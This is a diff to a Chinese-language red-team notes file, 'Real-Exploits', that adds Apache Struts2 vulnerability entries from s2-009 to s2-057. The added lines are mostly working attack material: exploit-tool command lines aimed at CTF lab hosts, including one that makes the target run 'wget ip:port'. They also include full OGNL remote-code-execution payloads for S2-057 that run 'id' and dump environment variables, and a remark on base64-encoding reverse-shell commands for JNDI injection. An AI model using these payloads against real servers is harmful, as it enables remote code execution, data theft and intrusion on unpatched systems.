@@ -1,6 +1,6 @@
-# Real
+# Real-Exploits
 
-
+# 大纲
 
 - [PHP](#PHP)
     - [XXE](XXE)
@@ -19,9 +19,16 @@
         - [Jinja2](#Jinja2)
     - [Django](#Django)
 - [Struts2](#Struts2)
+    - [s2-009](#s2-009)
+    - [s2-012](#s2-012)
     - [s2-013](#s2-013)
+    - [s2-015](#s2-015)
     - [s2-045](#s2-045)
+    - [s2-048](#s2-048)
+    - [s2-052](#s2-052)
     - [s2-053](#s2-053)
+    - [s2-057](#s2-057)
+- [httpd](#httpd)
 - [Ruby](#Ruby)
     - [Rails](#Rails)
         - [CVE-2019-5418](#CVE-2019-5418)
@@ -68,7 +75,7 @@
 
 - 参考文章
     - https://github.com/vulhub/vulhub
-    - https://github.com/ffffffff0x/1earn/blob/c3ee45b00d55a142a63f81da9602a4c9ca75b14e/1earn/Security/RedTeam/Web%E5%AE%89%E5%85%A8/BS-Exploits.md#tomcat
+    - https://github.com/ffffffff0x/1earn/blob/c3ee45b00d55a142a63f81da9602a4c9ca75b14e/1earn/Security/RedTeam/Web%E5%AE%89%E5%85%A8/BS-Exploits.md
 ## PHP
 
 ### XXE
@@ -266,7 +273,8 @@ id
 
 S2-046以后的洞难以扫出来，需要自己寻找利用点，简单来说没有通用的链
 
-其它利用工具：https://github.com/HatBoy/Struts2-Scan
+其它利用工具
+- https://github.com/HatBoy/Struts2-Scan - Python3 Struts2 全漏洞扫描利用工具
 
 ### s2-009
 影响版本: 2.1.0 - 2.3.1.1
@@ -299,7 +307,36 @@ payload:(读取etc/passwd文件)
 ```
 
 ### s2-013
+
+### s2-015
+
+影响版本: 2.0.0 - 2.3.14.2
 ### s2-045
+
+### s2-048
+
+影响版本: 2.0.0 - 2.3.32
+
+漏洞利用工具：https://github.com/dragoneeg/Struts2-048
+
+`python Struts048.py http://node4.buuoj.cn:28719/integration/saveGangster.action`
+
+`python Struts048.py http://node4.buuoj.cn:28719/integration/saveGangster.action whoami`
+
+![image](./img/s2-048.png)
+
+### s2-052
+
+影响版本: Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12
+
+启用 Struts REST 插件并使用 XStream 组件对 XML 进行反序列操作时，未对数据内容进行有效验证，可被攻击者进行远程代码执行攻击(RCE)。
+
+漏洞测试工具:
+- https://github.com/mazen160/struts-pwn_CVE-2017-9805
+
+```
+Python struts-pwn.py --exploit --url "http://node4.buuoj.cn:26796/orders/4/edit" -c "wget ip:port"
+```
 
 ### s2-053
 
@@ -318,6 +355,30 @@ http://your-ip:8080/hello.action
 
 ```
 ![image](./img/s2-053.png)
+
+## S2-057
+
+影响版本:<= Struts 2.3.34, Struts 2.5.16
+
+payload
+```
+http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action
+```
+
+```
+${
+(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))}
+```
+
+```
+
+http://node3.buuoj.cn:29922/struts2-showcase/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27env%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/actionChain1.action
+```
+
+![image](./img/s2-057.png)
+
+## httpd
+
 ## Ruby
 
 ### Rails
@@ -566,7 +627,7 @@ params=1
 
 相关工具：https://github.com/welk1n/JNDI-Injection-Exploit
 
-反弹shell需要先编码成base64 java可识别的
+反弹shell需要先编码成base64
 
 在线java编码网站：[java.lang.Runtime.exec() Payload Workarounds](https://www.jackson-t.ca/runtime-exec-payloads.html)
 
